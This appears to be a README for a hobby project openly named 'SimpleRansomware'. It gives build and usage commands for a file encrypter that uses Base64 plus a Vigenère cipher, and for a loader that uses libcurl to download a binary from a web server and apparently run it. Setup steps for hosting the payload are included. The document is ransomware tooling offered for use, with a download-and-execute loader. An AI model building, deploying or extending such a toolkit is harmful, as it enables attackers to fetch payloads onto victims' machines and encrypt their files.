# SimpleRansomware
Simple chiper ransomware with loader end encrypter. It use simple alghoritms: Base64 + Veginer
## Encrypter
### Build & Run
Compiling encrypter:
```
cd encrypter
g++ -static main.cpp -o encryptor -O0 -g
```
Example of usage:
```
./encrypter example.txt "My secret Key" 0
```
Flags:
1. filepath
2. key for encrypt/decrypt
3. 0/1 encrypt/decrypt

## Loader
### Build & Run
Compiling loader:
```
cd loader
g++ main.cpp -o loader -lcurl
```
Run loader:

_Note: You need to run web server for hosting compiled binary. For example use follow command `python3 -m http.server` in `encrypter/` folder_
```
./loader http://localhost:8080/decrypter
```
